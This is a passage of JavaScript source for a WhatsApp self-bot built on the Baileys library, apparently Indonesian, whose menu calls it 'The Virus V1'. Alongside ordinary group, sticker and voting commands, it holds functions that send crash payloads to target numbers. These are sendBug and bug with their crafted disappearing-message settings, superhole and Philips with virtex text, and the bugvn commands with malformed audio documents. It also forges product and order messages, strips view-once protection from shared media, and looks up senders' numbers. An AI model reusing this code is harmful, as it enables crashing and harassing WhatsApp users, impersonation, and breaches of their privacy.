		    teks = `Verification success\n\nPlease send *!menu* to view menu`
		    zoe.sendMessage(from, teks, text, {quoted: fkontak })
}          /*if (!dev.key.fromMe && banChats === false) return*/
	              
           
const getRegisteredRandomId = () => {
            return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
            const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
            _registered.push(obj)
            fs.writeFileSync('./database/user/registered.json', JSON.stringify(_registered))
        }
        
   
//******************* 》banchat《 ********************\\
if (isBanchat){
if (!itsMe && !isOwner)return 
}
    const ftokoo = {
      key: {
        fromMe: false,
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {}),
      },
      message: {
        productMessage: {
          product: {
            productImage: {
              mimetype: "image/jpeg",
              jpegThumbnail: fs.readFileSync(`./database/group/logo.jpg`), //Gambarnye
            },
            title: "FakeReply Bang", //Kasih namalu
            description: "SELF BOT",
            currencyCode: "USD",
            priceAmount1000: "2000",
            retailerId: "zoe",
            productImageCount: 1,
          },
          businessOwnerJid: `0@s.whatsapp.net`,
        },
      },
    };
 const ftok = {
key: {
			fromMe: false,
			participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})
		},
		message: {
			"productMessage": {
				"product": {
					"productImage":{
						"mimetype": "image/jpeg",
						"jpegThumbnail": iye //Gambarnye
					},
					"title": `${ucapanWaktu} ${pushname}`, //Kasih namalu 
					"description": `${ucapanWaktu} ${pushname}`, 
					"currencyCode": "USD",
					"priceAmount1000": "2000",
					"retailerId": `${ucapanWaktu} ${pushname}`,
					"productImageCount": 1
				},
				    "businessOwnerJid": `0@s.whatsapp.net`
		}
	}
}
    const sendMediaURL = async (to, url, text = "", mids = []) => {
      if (mids.length > 0) {
        text = normalizeMention(to, text, mids);
      }
      const fn = Date.now() / 10000;
      const filename = fn.toString();
      let mime = "";
      var download = function (uri, filename, callback) {
        request.head(uri, function (err, res, body) {
          mime = res.headers["content-type"];
          request(uri)
            .pipe(fs.createWriteStream(filename))
            .on("close", callback);
        });
      };
      download(url, filename, async function () {
        console.log("done");
        let media = fs.readFileSync(filename);
        let type = mime.split("/")[0] + "Message";
        if (mime === "image/gif") {
          type = MessageType.video;
          mime = Mimetype.gif;
        }
        if (mime.split("/")[0] === "audio") {
          mime = Mimetype.mp4Audio;
        }
        zoe.sendMessage(to, media, type, {
          quoted: dev,
          mimetype: mime,
          caption: text,
          contextInfo: { mentionedJid: mids },
        });

        fs.unlinkSync(filename);
      });
    };
const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
const foncevid = { 
key: {fromMe: false, remoteJid: "6281315995629@g.us", participant: '0@s.whatsapp.net'}, 
message: { 
  videoMessage: { 
  viewOnce: true
},
},
    };
 const fmen = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 2021,
                            status: 1,
                            surface : 1,
                            message: `Developed by ZoeDev`, //Kasih namalu
                            thumbnail: fs.readFileSync('./media/image/icon.jpg'), //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const sendBug = async (target) => {
      await zoe.relayWAMessage(
        zoe.prepareMessageFromContent(
          target,
          zoe.prepareDisappearingMessageSettingContent(0),
          {}
        ),{ waitForAck: true }) 
    }
///Button Text

const sendButMessage = (id, text1, desc1, but = [], options = {}) => {
const buttonMessage = {
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 1
}
zoe.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
const sendButDocument = async(id, text1, desc1, media, doc1, but = [], options = {}) => {
kma = doc1
mhan = await zoe.prepareMessage(from, media, document, kma)
const buttonMessages = {
documentMessage: mhan.message.documentMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: "DOCUMENT"
}
zoe.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Image
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await zoe.prepareMessage(from, kma, image)
const buttonMessages = {
imageMessage: mhan.message.imageMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 4
}
zoe.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Video
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await zoe.prepareMessage(from, kma, video)
const buttonMessages = {
videoMessage: mhan.message.videoMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 5
}
zoe.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
///Button Location
const sendButLocation = async (id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await zoe.prepareMessage(from, kma, location)
const buttonMessages = {
locationMessage: mhan.message.locationMessage,
contentText: text1,
footerText: desc1,
buttons: but,
headerType: 6
}
zoe.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
function superhole(nomor){
for(let i=0;i < 1;i++){
let nyefir = areatext.barVir(prefix)
zoe.sendMessage(nomor, nyefir, MessageType.extendedText, {quoted:fdoc})
}
function bug(jid){
for(let i=0;i < 1;i++){
var WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
zoe.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
  }
  function Philips(nomor){
for(let i=0;i < 1;i++){
let nyelips = areatext.Philips(prefix)
zoe.sendMessage(nomor, nyelips, MessageType.extendedText, {quoted:fdoc})
}
  }
    const kick = function (from, orangnya) {
      for (let i of orangnya) {
        zoe.groupRemove(from, [i]);
      }
    };
    const add = function (from, orangnya) {
      zoe.groupAdd(from, orangnya);
    };
        const grupinv = (teks) => {
        	grup = zoe.prepareMessageFromContent(from, { "groupInviteMessage": { "groupJid": '6288213840883-1616169743@g.us', "inviteCode": 'https://chat.whatsapp.com/Dgt6JhzTvlmEor8Zz23fHx', "groupName": `Argio Dev`, "footerText": "*_© Dcode Denpa_*", "jpegThumbnail": iye, "caption": teks}}, {quoted:dev})
            zoe.relayWAMessage(grup)
        }
const fakeitem = (teks) => {
            zoe.sendMessage(from, teks, text, {
                quoted: {
        key:{
        	fromMe:false,
        participant:`0@s.whatsapp.net`, ...(from ? {
remoteJid :"6289523258649-1604595598@g.us" }: {})
                    },message:{"orderMessage":{"orderId":"174238614569481","thumbnail":fs.readFileSync(`./database/group/logo.jpg`),"itemCount":10,"status":"INQUIRY","surface":"CATALOG","message":`Ndyie Botz`,"token":"AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="}}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true})}
// Katalog
const reply = (teks) => {
				zoe.sendMessage(from, teks, text, {quoted:dev})
		   }
		   const zreply = (teks) => {
             res = zoe.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 111119999, "message": teks, "footerText": "*ZoeDev*", "thumbnail": bgg, "surface": 'CATALOG' }}, {quoted:fdoc})
             zoe.relayWAMessage(res)
}
const fakewa = (teks) => {        
zoe.sendMessage(from, teks, text, { thumbnail: fake, sendEphemeral: true, quoted: dev, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/6283146208804?text=Assalamualaikum`}}})
		}
const replyfakelink = (teks) => {
zoe.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp-BOT\nM a a n. (@_Ndyie Botz) •Instagram photos and Videos`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://a.top4top.io/p_2073icief0.jpg",
                "thumbnail": fake,
                "sourceUrl": ``
},mentionedJid:[sender]}, quoted : fgif})
};
const replywa = (teks) => {
zoe.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
                "title": `Whatsapp`,
                "body": `wa.me/6285163999446`,
                "mediaType": "10",
                "mediaUrl": `wa.me/6285163999446`,
                "thumbnailUrl": "https://j.top4top.io/p_20682m4yj0.jpg",
                "thumbnail": iye,
                "sourceUrl": `wa.me/6285163999446`,
},mentionedJid:[sender]}, quoted : dev})
};
const fakeyt = (teks) => {
zoe.sendMessage(from, teks, text,{contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: false,
sendEphemeral: false,
"externalAdReply": {
"title": `hallo ${pushname}` ,
"body": `${ucapanWaktu}`,
"mediaType": "2",
"thumbnailUrl": "https://c.top4top.io/p_2087f30hj1.jpeg",
"mediaUrl": "https://youtu.be/uygjD8rqVLE",
"thumbnail": fs.readFileSync('./database/group/logo.jpg'),
"sourceUrl": "",
},mentionedJid:[sender]}, quoted : fgif})
};
// Support Di Versi 3.5.2 
/*
    const sendBug = async (target, teks) => {
      if (!teks) teks = ".";
      await zoe.relayWAMessage(
        zoe.prepareMessageFromContent(
          target,
          zoe.prepareDisappearingMessageSettingContent(0),
          {}
        ),
        { waitForAck: true }
      );
      zoe.sendMessage(target, teks, "conversation");
    };
*/
    //FUNCTION
    function clockString(ms) {
      let h = isNaN(ms) ? "--" : Math.floor(ms / 3600000);
      let m = isNaN(ms) ? "--" : Math.floor(ms / 60000) % 60;
      let s = isNaN(ms) ? "--" : Math.floor(ms / 1000) % 60;
      return [h, m, s].map((v) => v.toString().padStart(2, 0)).join(":");
    }

    cekafk(afk);
    if (!dev.key.remoteJid.endsWith("@g.us") && offline) {
      if (!dev.key.fromMe) {
        if (isAfk(dev.key.remoteJid)) return;
        addafk(dev.key.remoteJid);
        heheh = ms(Date.now() - waktu);
        zoe.sendMessage(
          dev.key.remoteJid,
          `@${owner} Sedang Offline!\n\n*Alasan :* ${alasan}\n*Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
          MessageType.text,
          {
            contextInfo: {
              mentionedJid: [`${owner}@s.whatsapp.net`],
              stanzaId: "B826873620DD5947E683E3ABE663F263",
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                imageMessage: {
                  caption: "*OFFLINE*",
                  jpegThumbnail: fs.readFileSync("./database/group/logo.jpg"),
                },
              },
            },
          }
        );
      }
    }
    if (dev.key.remoteJid.endsWith("@g.us") && offline) {
      if (!dev.key.fromMe) {
        if (dev.message.extendedTextMessage != undefined) {
          if (dev.message.extendedTextMessage.contextInfo != undefined) {
            if (
              dev.message.extendedTextMessage.contextInfo.mentionedJid !=
              undefined
            ) {
              for (let ment of dev.message.extendedTextMessage.contextInfo
                .mentionedJid) {
                if (ment === `${owner}@s.whatsapp.net`) {
                  if (isAfk(dev.key.remoteJid)) return;
                  addafk(dev.key.remoteJid);
                  heheh = ms(Date.now() - waktu);
                  zoe.sendMessage(
                    dev.key.remoteJid,
                    `@${owner} Sedang Offline!\n\n *Alasan :* ${alasan}\n *Sejak :* ${heheh.hours} Jam, ${heheh.minutes} Menit, ${heheh.seconds} Detik lalu\n\nSilahkan Hubungi Lagi Nanti`,
                    MessageType.text,
                    {
                      contextInfo: {
                        mentionedJid: [`${owner}@s.whatsapp.net`],
                        stanzaId: "B826873620DD5947E683E3ABE663F263",
                        participant: "0@s.whatsapp.net",
                        remoteJid: "status@broadcast",
                        quotedMessage: {
                          imageMessage: {
                            caption: "*OFFLINE*",
                            jpegThumbnail: fs.readFileSync("./database/group/logo.jpg"),
                          },
                        },
                      },
                    }
                  );
                }
              }
            }
          }
        }
      }
    }

    //========================================================================================================================//
    colors = ["red", "white", "black", "blue", "yellow", "green"];
    const isMedia = type === "imageMessage" || type === "videoMessage";
    const isQuotedImage =
      type === "extendedTextMessage" && content.includes("imageMessage");
    const isQuotedVideo =
      type === "extendedTextMessage" && content.includes("videoMessage");
    const isQuotedAudio =
      type === "extendedTextMessage" && content.includes("audioMessage");
    const isQuotedSticker =
      type === "extendedTextMessage" && content.includes("stickerMessage");

/*if (listbut) console.log("[",color("command","lime"),"]",time2,color(listbut,"lime"),"from",color(sender.split("@")[0],"cyan"))*/
//list command

async function sendFileFromUrl(from, url, caption, msg, men) {
            let mime = '';
            let res = await axios.head(url)
            mime = res.headers['content-type']
            let type = mime.split("/")[0]+"Message"
            if(mime === "image/gif"){
                type = MessageType.video
                mime = Mimetype.gif
            }
            if(mime === "application/pdf"){
                type = MessageType.document
                mime = Mimetype.pdf
            }
            if(mime.split("/")[0] === "audio"){
                mime = Mimetype.mp4Audio
            }
            return zoe.sendMessage(from, await getBuffer(url), type, {caption: caption, quoted: dev, mimetype: mime, contextInfo: {"mentionedJid": men ? men : []}})
        }
    if (!isGroup && prefix && command)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "args :",
        color(args.length)
      );
    //if (!isGroup && !isCmd) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'args :', color(args.length))
    if (prefix && command && isGroup)
      console.log(
        "\x1b[1;31m~\x1b[1;37m>",
        "[\x1b[1;32mEXEC\x1b[1;37m]",
        time,
        color(command),
        "from",
        color(sender.split("@")[0]),
        "in",
        color(groupName),
        "args :",
        color(args.length)
      );
    //if (!isCmd && isGroup) console.log('\x1b[1;31m~\x1b[1;37m>', '[\x1b[1;31mTEXT\x1b[1;37m]', time, color('Message'), 'from', color(sender.split('@')[0]), 'in', color(groupName), 'args :', color(args.length))
    if (isGroup && !isVote) {
      if (budy.toLowerCase() === "vote") {
        let vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6283833310095@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "✅",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      } else if (budy.toLowerCase() === "devote") {
        const vote = JSON.parse(fs.readFileSync(`./lib/${from}.json`));
        let _votes = JSON.parse(fs.readFileSync(`./lib/vote/${from}.json`));
        let fil = vote.map((v) => v.participant);
        let id_vote = sender ? sender : "6281314050985@s.whatsapp.net";
        if (fil.includes(id_vote)) {
          return mentions(
            "@" + sender.split("@")[0] + " Anda sudah vote",
            fil,
            true
          );
        } else {
          vote.push({
            participant: id_vote,
            voting: "❌",
          });
          fs.writeFileSync(`./lib/${from}.json`, JSON.stringify(vote));
          let _p = [];
          let _vote =
            "*Vote* " +
            "@" +
            _votes[0].votes.split("@")[0] +
            `\n\n*Alasan*: ${_votes[0].reason}\n*Jumlah Vote* : ${vote.length} Vote\n*Durasi* : ${_votes[0].durasi} Menit\n\n`;
          for (let i = 0; i < vote.length; i++) {
            _vote += `@${vote[i].participant.split("@")[0]}\n*Vote* : ${
              vote[i].voting
            }\n\n`;
            _p.push(vote[i].participant);
          }
          _p.push(_votes[0].votes);
          mentions(_vote, _p, true);
        }
      }
    }
       const vcard = 'BEGIN:VCARD\n'
            + 'VERSION:3.0\n' 
            + 'FN:ZoeDev7\n'
            + 'TEL;type=CELL;type=VOICE;waid=`6285163999446:+6285163999446' 
            + 'END:VCARD'
        chatss = (type === 'conversation') ? dev.message.conversation : (type === 'extendedTextMessage') ? dev.message.extendedTextMessage.text : ''

    //kasih wm gw ajg kalau make
    if (isGroup && isAntilink && !dev.key.fromMe) {
      if (budy.includes("https://chat.whatsapp.com/")) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTILINK DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        zoe.groupRemove(from, [sender]);
      }
    }
    if (isGroup && isAntiviewonce && m.mtype == "viewOnceMessage") {
      reply(
        `@${sender.split("@")[0]} Terdeteksi mengirim gambar/video viewonce!`
      );
      var msg = { ...dev };
      msg.dev = dev.message.viewOnceMessage.message;
      msg.dev[Object.keys(msg.dev)[0]].viewOnce = false;
      zoe.copyNForward(m.chat, msg);
    }
    if (
      isGroup &&
      isAntihidetag &&
      m.message[m.mtype]?.contextInfo?.mentionedJid?.length ==
        groupMembers.length
    ) {
      console.log(
        color("[ANTI-HIDETAG]", "red"),
        color(`@${sender.split("@")[0]} mengirim pesan hidetag`, "white")
      );
      reply(`@${sender.split("@")[0]} Terdeteksi mengirim pesan hidetag!!`);
      kick(from, sender);
    }

    if (isGroup && isAntivirtex && !dev.key.fromMe) {
      if (budy.length > 700) {
        if (isGroupAdmins) return reply("admin bebas");
        reply("ANTIVIRTEX DETECTED!! MAAF ANDA AKAN DIKICK ;V");
        zoe.groupRemove(from, sender);
      }
    }
    if (isGroup && autojoin == true) {
      if (budy.includes("https://chat.whatsapp.com/")) {
        console.log(
          color("[AUTO-JOIN]", "red"),
          color("YAHAHAHHAHAH", "white")
        );
        zoe.query({
          json: [
            "action",
            "invite",
            `${budy.replace("https://chat.whatsapp.com/", "")}`,
          ],
        });
      }
    }
    if (isGroup && isKickarea && !dev.key.fromMe) {
      if (sender.includes("62")) {
        reply("GRUP ONLY +62!");
        zoe.groupRemove(from, [sender]);
      }
    }
    // Runtime Di Bio Bang🌹\\
    let settingstatus = 0;
    if (new Date() * 1 - settingstatus > 1000) {
      let _uptime = process.uptime() * 1000;
      let uptime = clockString(_uptime);

await zoe.setStatus(`Mode Bot ZoeDev Aktif Selama ${uptime}`).catch((_) => _);
      settingstatus = new Date() * 1;
    }
    if (!dev.key.fromMe && banChats === true) return;
switch(command) {
			   case 'public':
          	if (!dev.key.fromMe && !isOwner) return
          	if (banChats === false) return
          	// var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
          	banChats = false
          	reply(`「 *PUBLIC-MODE* 」`)
          	break
	case 'self':
          	if (!dev.key.fromMe && !isOwner) return
          	if (banChats === true) return
          	uptime = process.uptime()
         	 // var taged = ben.message.extendedTextMessage.contextInfo.mentionedJid[0]
         	banChats = true
          	reply(`「 *SELF-MODE* 」`)
          	break
case 'bugvn2':
if (!dev.key.fromMe && !isOwner) return
sssssss = fs.readFileSync('./audio/date.mp3')
zoe.sendMessage(from, sssssss, document, { quoted: dev, filename:`${jadivirtex1}.mp3`, mimetype: 'audio/application' })
break
case 'bugvn3':
if (!dev.key.fromMe && !isOwner) return
sssssss = fs.readFileSync('./sound1/date.mp3')
zoe.sendMessage(from, sssssss, document, { quoted: dev, filename:`${jadivirtex1}.mp3`, mimetype: 'audio/application' })
break
case 'bugvn4':
if (!dev.key.fromMe && !isOwner) return
sssssss = fs.readFileSync('./sound2/date.mp3')
zoe.sendMessage(from, sssssss, document, { quoted: dev, filename:`${jadivirtex1}.mp3`, mimetype: 'audio/application' })
break
case 'bugvn5':
if (!dev.key.fromMe && !isOwner) return
sssssss = fs.readFileSync('./sound3/date.mp3')
zoe.sendMessage(from, sssssss, document, { quoted: dev, filename:`${jadivirtex1}.mp3`, mimetype: 'audio/application' })
break
          	case 'welcome':
					if (!isGroup) return reply(mess.only.group)					
					if (args.length < 1) return reply('Udah Aktif Kak')
					if (Number(args[0]) === 1) {
						if (isWelkom) return reply('Udah aktif um')
						welkom.push(from)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
					} else if (Number(args[0]) === 0) {
						welkom.splice(from, 1)
						fs.writeFileSync('./src/welkom.json', JSON.stringify(welkom))
						reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
					} else {
						reply('1 untuk mengaktifkan, 0 untuk menonaktifkan')
					}
                                      break	
case 'setname':
if (!isGroup) return reply(`Apa Apa An Ini`)
if (!isGroupAdmins) return reply(`Apa Apa An Ini`)
if (!isBotGroupAdmins) return reply(`Apa Apa An Ini`)
zoe.groupUpdateSubject(from, `${body.slice(9)}`)
zoe.sendMessage(from, `\`\`\`✓Sukses Mengganti Nama Group Menjadi\`\`\` *${body.slice(9)}*`, text, { quoted: ftrol })
break
case 'imgtag':
			 if (!dev.key.fromMe) return reply('Lu siapa')
            if (!dev.key.fromMe && !isGroupAdmins) return reply(mess.admin)
            if ((isMedia && !dev.message.videoMessage || isQuotedImage) && args.length == 0) {
            encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dev).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dev
            file = await zoe.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await zoe.groupMetadata(from)
            var member = group['participants']
            var mem = []
            member.map(async adm => {
            mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
            })
            var options = {
                contextInfo: { mentionedJid: mem },
                quoted: dev
            }
            ini_buffer = fs.readFileSync(file)
            zoe.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            } else {
            reply(`*Reply sticker yang sudah dikirim*`)
            }
            break
case 'setdesc':
if (!isGroup) return reply(`Apa Apa An Ini`)
if (!isGroupAdmins) return reply(`Apa Apa An Ini`)
if (!isBotGroupAdmins) return reply(`Apa Apa An Ini`)
zoe.groupUpdateDescription(from, `${body.slice(9)}`)
zoe.sendMessage(from, `\`\`\`✓Sukses Mengganti Deskripsi Group\`\`\` *${groupMetadata.subject}* Menjadi: *${body.slice(9)}*`, text, { quoted: ftrol })
break
        	case 'menu':
        case 'help':        
        dtod = "-"
     otod = `${pushname}@s.whatsapp.net`
        stod = `ZoeDev`
       stst = await zoe.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? 'unknown' : stst.status
			num = await fetchJson(`https://numlookupapi.com/api/validate/${senderNumber}`, {method: 'get'})
       menu = `〽️ꪶ 𝐓𝐡𝐞 𝐕𝐢𝐫𝐮𝐬 𝐕𝟏 ꫂ ꪶ〩 ꫂ🔥
       
╔─❒ 「 𝐵𝑜𝑡 𝐼𝑛𝑓𝑜 」 ❒
┃ Nama Bot : Raisa Fariza
║ Prefix : Multi Prefix
┃ Lib : Baileys
║ Language : Javascript
┃ Update Body : V3
║ Platform : Windows
┃ Nomor Owner : ${nomerOwner}
║ Runtime : ${runtime(process.uptime())}
┃ Language : Javascript & Nodejs
╚❏

╔─❏ 𝐈𝐍??𝐎𝐍𝐄𝐒𝐈𝐀 𝐓𝐈𝐌𝐄
┃ 𝙒𝙄𝘽 : *${moment().utcOffset('+0700').format('HH:mm')}*
║ 𝙒𝙄𝙏𝘼 : *${moment().utcOffset('+0800').format('HH:mm')}*
┃ 𝙒𝙄𝙏 : *${moment().utcOffset('+0900').format('HH:mm')}*
╰❏

╔─❒ 「 𝑈𝑠𝑒𝑟 𝐼𝑛𝑓𝑜 」 ❒
┃ Status : ${isOwner ? 'Owner' : 'User'}
║ Nama  : ${pushname}
┃ Nomor : ${sender.split('@')[0]}
╚❏

╔─❒ 「 𝑇ℎ𝑎𝑘𝑠 𝐼𝑛𝑓𝑜 」 ❒
┃ 𝐋𝐢𝐧𝐤 𝐂𝐡𝐚𝐧𝐞𝐥 
║ https://bit.ly/3e7upsz
║ 𝐋𝐢𝐧𝐤 𝐆𝐫𝐮𝐛
┃ https://bit.ly/3J8DuQc
╚❏`
lima = fs.readFileSync('./audio menu/audio1.mp3');
                    zoe.sendMessage(from, lima, MessageType.audio, {quoted: dev, mimetype: 'audio/mp4', ptt:true})
sendButDocument(from, `${menu}`, "*_Zextz High7_*", fs.readFileSync('./sampah/Denpa'), {mimetype:Mimetype.pdf, thumbnail:fs.readFileSync('./media/image/banner.jpg'), filename:`Script 𝑍𝑒𝑥𝑡𝑧 𝐻𝑖𝑔ℎ7 𝑋 𝑅𝑎𝑛𝑧 𝑀5`}, [{buttonId:`ko`,buttonText:{displayText:'⏁ 𝑀𝐸𝑁𝑈'},type:1},{buttonId:`owner`,buttonText:{displayText:'⏁ 𝐷𝐸𝑉𝐸𝐿𝑂𝑃𝐸𝑅'},type:1},{buttonId:`cekgiff`,buttonText:{displayText:'⏁ 𝐴𝐿𝐿 𝐵𝑈𝐺𝐵𝑂𝑇'},type:1}], {quoted:fmen, contextInfo: { mentionedJid: [dtod,otod,stod], forwardingScore: 508, isForwarded: true, externalAdReply:{title:`${nomerOwner} ${pushname}`,body:`*click here to play music`,mediaType:"2",thumbnail:ftrol,mediaUrl:`https://youtu.be/jT-th_f0l-Y`}}})
break

                                      
                                      case 'ko':                   
			gambar = thumb
                   timestamp = speed();
				latensi = speed() - timestamp
              menunya = 
`
╔─❒ 「 𝐵𝑜𝑡 𝐼𝑛𝑓𝑜 」 ❒
┃ Nama Bot : Raisa Bot
║ Prefix : Multi Prefix
┃ Nomor Owner : ${nomerOwner}
║ Runtime : ${runtime(process.uptime())}
┃ Language : Javascript & Nodejs
╚❏

╔─❒ 「 𝑈𝑠𝑒𝑟 𝐼𝑛𝑓𝑜 」 ❒
┃ Nama  : ${pushname}
┃ Nomor : ${sender.split('@')[0]}
╚❏

╔─❒ 「 〽️ꪶ 𝙏𝙌𝙏𝙌 ꫂ ꪶ〩 ꫂ🔥 」 ❒
┃ 𝐙𝐞𝐱𝐭𝐳 𝐇𝐢𝐠𝐡𝟕
║ https://bit.ly/3e7upsz
║ 𝐑𝐚𝐧𝐳 𝐌𝟓
┃ https://bit.ly/3yI9XYV
╚❏

╔─❒「 𝐵𝑜𝑡 𝑀𝑒𝑛𝑢 」❒
┃➣㋡⃟🎭 ${prefix}colongsw 
║➣㋡⃟🎭 ${prefix}bc
┃➣㋡⃟🎭 ${prefix}bcnowm
║➣㋡⃟🎭 ${prefix}self
┃➣㋡⃟🎭 ${prefix}public
╚❒

╔─❒「 𝐺𝑟𝑜𝑢𝑝 𝑀𝑒𝑛𝑢 」❒
┃➣㋡⃟🎭 ${prefix}welcome
║➣㋡⃟🎭 ${prefix}promote
┃➣㋡⃟🎭 ${prefix}demote
║➣㋡⃟🎭 ${prefix}add
┃➣㋡⃟🎭 ${prefix}kick
║➣㋡⃟🎭 ${prefix}setdesc
┃➣㋡⃟🎭 ${prefix}setname
║➣㋡⃟🎭 ${prefix}hidetag
┃➣㋡⃟🎭 ${prefix}sticktag
║➣㋡⃟🎭 ${prefix}imgtag
┃➣㋡⃟🎭 ${prefix}tagall
╚❒

╔─❒「 𝑀𝑎𝑘𝑒𝑟 𝑀𝑒𝑛𝑢 」❒
┃➣㋡⃟🎭 ${prefix}attp
║➣㋡⃟🎭 ${prefix}sticker
┃➣㋡⃟🎭 ${prefix}nulis
║➣㋡⃟🎭 ${prefix}maker2d2
┃➣㋡⃟🎭 ${prefix}maker2d3
║➣㋡⃟🎭 ${prefix}maker2d4
┃➣㋡⃟🎭 ${prefix}maker3d
║➣㋡⃟🎭 ${prefix}maker3d2
┃➣㋡⃟🎭 ${prefix}maker3d3
║➣㋡⃟🎭 ${prefix}maker3d4
┃➣㋡⃟🎭 ${prefix}coffeecup
║➣㋡⃟🎭 ${prefix}coffeecup2
┃➣㋡⃟🎭 ${prefix}neon
║➣㋡⃟🎭 ${prefix}smeme
┃➣㋡⃟🎭 ${prefix}avengers
║➣㋡⃟🎭 ${prefix}certificateff
┃➣㋡⃟🎭 ${prefix}magma
║➣㋡⃟🎭 ${prefix}pipaair
╚❒

╔─❒「 𝑆𝑜𝑢𝑛𝑑 𝑀𝑒𝑛𝑢 」❒
┃➣㋡⃟🎭 ${prefix}sound1
║➣㋡⃟🎭 ${prefix}sound2
┃➣㋡⃟🎭 ${prefix}sound3
║➣㋡⃟🎭 ${prefix}sound4
┃➣㋡⃟🎭 ${prefix}sound5
║➣㋡⃟🎭 ${prefix}sound6
┃➣㋡⃟🎭 ${prefix}sound7
║➣㋡⃟🎭 ${prefix}sound8
┃➣㋡⃟🎭 ${prefix}sound9
║➣㋡⃟🎭 ${prefix}sound10
┃➣㋡⃟🎭 ${prefix}sound11
║➣㋡⃟🎭 ${prefix}sound12
┃➣㋡⃟🎭 ${prefix}sound13
║➣㋡⃟🎭 ${prefix}sound14
┃➣㋡⃟🎭 ${prefix}sound15
║➣㋡⃟🎭 ${prefix}sound16
┃➣㋡⃟🎭 ${prefix}sound17
║➣㋡⃟🎭 ${prefix}sound18
┃➣㋡⃟🎭 ${prefix}sound19
║➣㋡⃟🎭 ${prefix}sound20
┃➣㋡⃟🎭 ${prefix}sound21
║➣㋡⃟🎭 ${prefix}sound22
┃➣㋡⃟🎭 ${prefix}sound23
║➣㋡⃟🎭 ${prefix}sound24
┃➣㋡⃟🎭 ${prefix}sound25
║➣㋡⃟🎭 ${prefix}sound26
┃➣㋡⃟🎭 ${prefix}sound27
║➣㋡⃟🎭 ${prefix}sound28
┃➣㋡⃟🎭 ${prefix}sound29
║➣㋡⃟🎭 ${prefix}sound30
┃➣㋡⃟🎭 ${prefix}sound31
╚❒
	
╔─❒「 𝐶𝑜𝑛𝑣𝑒𝑟𝑡 𝑀𝑒𝑛𝑢 」❒
┃➣㋡⃟🎭 ${prefix}fast
║➣㋡⃟🎭 ${prefix}slow
